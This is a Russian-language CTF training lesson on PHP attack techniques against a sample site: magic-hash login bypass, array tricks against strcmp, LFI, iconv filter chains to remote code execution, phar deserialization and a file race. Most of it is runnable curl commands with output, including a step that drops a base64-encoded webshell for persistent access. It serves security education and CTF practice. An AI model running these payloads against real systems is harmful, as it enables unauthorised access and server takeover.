---
id: web-php-tricks
title: "PHP internals для CTF: type juggling, magic hashes, filter chains, phar"
category: web
parent: web-deser-expert
difficulty: expert
order: 3
tags: [php, type-juggling, magic-hash, filter-chain, phar, ctf]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "PHP-специфика для CTF: type juggling и magic hashes, обход сравнений, filter chains до RCE, phar-десериализация, race в файлах."
---

## Вопрос, с которого всё начинается

Мы прошли десериализацию. Но у PHP есть набор особенностей языка, которые регулярно дают обходы — и на CTF, и в реальных приложениях. Это не отдельный класс уязвимостей, а **инструментарий**, который применяется поверх логин-форм, LFI и загрузки файлов.

Вопрос: как пройти проверку пароля, не зная его, и как превратить «просто чтение файла» в выполнение кода? Разберём это на одном примере — PHP-приложении с логином и страницей с параметром `page`.

## Наш пример

Есть PHP-приложение `blog.example`. Начнём с формы логина. Посмотрим на условие проверки (по ошибкам/утечке исходника понятно, что оно такое):

```php
if (md5($_POST['pass']) == $stored_hash) { /* вход */ }
```

Здесь две слабости: хеш MD5 и **нестрогое** сравнение `==`. Сравним поведение:

- `===` — «строгое» сравнение: типы и значения должны совпадать;
- `==` — «нестрогое»: PHP сначала приводит типы, потом сравнивает.

Именно приведение типов и создаёт дыру.

## Шаг 1: type juggling и magic hashes

Если строка выглядит как «число в научной нотации» (`0e` + цифры), PHP при сравнении приводит её к числу `0`. Значит, две разные строки вида `0e123...` и `0e456...` **равны**:

```php
"0e123" == "0e456"   // true: обе приводятся к 0
```

Теперь фокус: есть строки, чей **MD5 начинается с `0e` и состоит из цифр**. Их называют **magic hashes** («магические хеши»). Проверим:

```bash
$ php -r 'echo md5("240610708");'
0e462097431906509019562988736854
$ php -r 'echo md5("QNKCDZO");'
0e830400451993494058024219903391
```

Оба хеша приводятся к `0`. Если сервер сравнивает `md5($pass) == md5($known)` или `md5($pass) == $stored` (а `$stored` тоже `0e...`), то подставив `240610708` в поле пароля, мы пройдём проверку:

```bash
$ curl -s -X POST https://blog.example/login --data 'user=admin&pass=240610708'
{"ok":true,"role":"admin"}
```

Мы вошли как админ, не зная пароля. Артефакт — успешный вход. Другие magic hashes: `QNKCDZO`, `aabg7XSs` (MD5), `aaroZmOk`, `aaK1STfY` (SHA1). Полный список — в `PayloadsAllTheThings`.

## Шаг 2: обход функций массивом

Второй трюк — передать **массив** там, где ждут строку. Многие PHP-функции при массиве ведут себя неожиданно:

- `strcmp($a, $b)` при массиве возвращает `NULL`, а `NULL == 0` → `true`;
- `preg_match(...)` при массиве возвращает `false` (а не `0`);
- `in_array($x, $arr)` без третьего аргумента сравнивает нестрого.

```bash
$ curl -s -X POST https://blog.example/login --data 'user=admin&pass[]=x'
{"ok":true,"role":"admin"}
```

Синтаксис `pass[]=x` в теле запроса заставляет PHP создать массив вместо строки. Если проверка была `if (strcmp($_POST['pass'], $secret) == 0)` — она ломается и пропускает нас. Тот же приём работает против `if (!preg_match('/^[a-z]+$/', $_POST['user']))`: массив вернёт `false`, а `!false` → `true`.

## Шаг 3: LFI и `php://filter`

Теперь вторая половина. На странице есть параметр `page`:

```bash
$ curl -s 'https://blog.example/?page=about.php' | grep -o 'About'
About
```

Проверим, не читает ли он файлы напрямую:

```bash
$ curl -s 'https://blog.example/?page=/etc/passwd' | head -1
root:x:0:0:root:/root:/bin/bash
```

Это **LFI** (Local File Inclusion) — параметр попадает в `include`/`file_get_contents`. Обычно так читают исходники, но `include` **исполняет** PHP-код. Чтобы код появился в потоке, используют обёртку `php://filter` — она применяет фильтры к содержимому файла на лету.

## Шаг 4: filter chain → RCE

Самый надёжный способ превратить LFI в RCE на современном PHP — **цепочка фильтров `iconv`**. Она умеет «дописывать» произвольный PHP-код в поток, который затем исполняет `include`. Ни `allow_url_include`, ни загрузка файла не нужны.

```bash
$ git clone https://github.com/synacktiv/php_filter_chain_generator
$ python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1 > chain.txt
$ wc -c chain.txt
9812 chain.txt
$ curl -s "https://blog.example/?page=$(cat chain.txt)" | head
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uid=33(www-data)` — код выполнен. Сразу строим **устойчивый** канал (webshell), а не гоняем `id` по длинной цепочке каждый раз:

```bash
$ python3 php_filter_chain_generator.py --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' | tail -1 > chain.txt
$ curl -s "https://blog.example/?page=$(cat chain.txt)" >/dev/null
$ curl -s 'https://blog.example/s.php?c=id'
uid=33(www-data) ...
```

Важно: цепочка очень длинная (иногда 8–30 КБ) — URL может упереться в лимит. Тогда отправляй `POST` в теле или через `curl -G --data-urlencode`.

## Шаг 5: phar — десериализация без `unserialize`

Третья PHP-особенность: **метаданные phar-архива** десериализуются автоматически при обращении к `phar://` — в том числе через обычные файловые функции (`file_exists`, `getimagesize`, `is_file`, `stat`, `fopen`). Явного `unserialize` не нужно.

```bash
$ ./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
# загружаем exploit.phar (маскируем под .jpg — важен контент, не имя)
$ curl -s "https://blog.example/avatar?src=phar://uploads/exploit.phar/test"
```

Связка «загрузка файла + любое чтение по управляемому пути» → RCE. phar можно замаскировать под картинку: stub `GIF89a` в начале + расширение `.jpg` — фильтры по расширению пропустят, но `phar://` всё равно десериализует.

## Шаг 6: прочие трюки

- **Строковая инкрементация:** `$a='z'; $a++;` → `'aa'` — обход фильтров, ожидающих буквы.
- **`__PHP_Incomplete_Class`** — маркер `unserialize` без класса.
- **`create_function`/`preg_replace /e`** (старые PHP) — прямой RCE.
- **`assert()`** со строкой (PHP < 8) — исполняет код.
- **`session.upload_progress`** — запись произвольного файла в `/tmp` при LFI:

```bash
$ curl -s -F 'PHP_SESSION_UPLOAD_PROGRESS=<?=`id`;?>' -F 'f=@x' \
     -b 'PHPSESSID=aaa' 'https://blog.example/upload'
$ curl -s 'https://blog.example/?page=/tmp/sess_aaa'
```

## Шаг 7: race condition в файловых операциях

PHP-код, который **сначала проверяет** файл (`is_uploaded_file`, `file_exists`), а **потом использует**, уязвим к гонке (TOCTOU): между проверкой и использованием файл можно подменить симлинком на `/etc/passwd` или на скрипт.

```bash
$ while :; do ln -sf /etc/passwd /tmp/upload_target 2>/dev/null; done &
```

Точный тайминг подмены ловят `inotifywait`. Так «просто чтение» превращается в чтение произвольных файлов и иногда в RCE.

## Что мы теперь знаем

- `==` приводит типы: `"0e1" == "0e2"` → `true`.
- **Magic hashes** — строки, чей MD5/SHA1 вида `0e\d+`; подставляются против `==`.
- **Массив** (`param[]=x`) ломает `strcmp`/`preg_match`/`in_array`.
- LFI + `php://filter` filter chain → RCE без загрузки файла.
- `phar://` десериализует метаданные даже без `unserialize`.
- Race condition (TOCTOU) в файловых операциях даёт подмену файла.
- Артефакт — успешный вход / вывод `id`, а не «страница отдала 200».

## На что смотреть дальше

- **Проверяй версию PHP.** `0 == "a"` стало `false` в PHP 8, но `0e`-пары работают всегда.
- **Пробуй массив раньше, чем сложные payload'ы** — `param[]=x` ломает многие проверки.
- **Не считай phar безобидным** — любая файловая функция триггерит десериализацию.
- **Читай исходники через `php://filter/convert.base64-encode`** — обычный путь может не сработать.
- **Строй устойчивый канал** после первого RCE — не гоняй `id` по длинной цепочке.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: 'Почему `"0e123" == "0e456"` истинно?'
  options:
    - "Строки равны посимвольно"
    - "Обе интерпретируются как число 0 в научной нотации"
    - "PHP сравнивает длину"
    - "Это ошибка"
  answer: 1
  explanation: "Нестрогое сравнение приводит строку вида `0e...` к числу 0."
- question: "Что такое magic hash?"
  options:
    - "Хеш от пароля"
    - "Строка, чей хеш вида `0e\\d+` (приводится к 0)"
    - "SHA-256 от соли"
    - "Base64 от MD5"
  answer: 1
  explanation: "Используется против сравнения `==`."
- question: "Как обойти `strcmp($_POST['pass'], $secret) == 0`?"
  options:
    - "Передать строку"
    - "Передать `pass[]=x` — strcmp вернёт NULL, а NULL == 0"
    - "Сменить метод"
    - "Добавить cookie"
  answer: 1
  explanation: "Массив ломает strcmp, и сравнение с 0 проходит."
- question: "Как превратить LFI в RCE на современном PHP?"
  options:
    - "Никак"
    - "Цепочкой фильтров `php://filter` (iconv), дописывающей код"
    - "Сменить браузер"
    - "Добавить cookie"
  answer: 1
  explanation: "filter chain генерирует валидный PHP в потоке, который исполняет include."
- question: "Чем опасен `phar://`?"
  options:
    - "Он медленный"
    - "Авто-десериализует метаданные при файловых операциях, даже без `unserialize`"
    - "Он шифрует данные"
    - "Он блокирует загрузку"
  answer: 1
  explanation: "Триггерится через `file_exists`/`getimagesize`/`stat`."
```

## Куда дальше

Дальше мы разберём SSTI конкретных движков — как отличить один шаблонизатор от другого и построить цепочку под каждый (`web-ssti-engines`). А пока главное запомни: PHP-трюки — это **инструментарий поверх других уязвимостей**, и `==` плюс `php://filter` часто открывают путь там, где «ломать» вроде нечего.

## Где пригодится

- **CTF (Web):** PHP-задачи почти всегда с этими трюками.
- **Bug bounty:** обход логики/сравнений.
- **Пентест:** аудит PHP-кода.
- **Работа (AppSec):** strict-сравнения, `===`, отказ от phar/unserialize, обновление PHP.
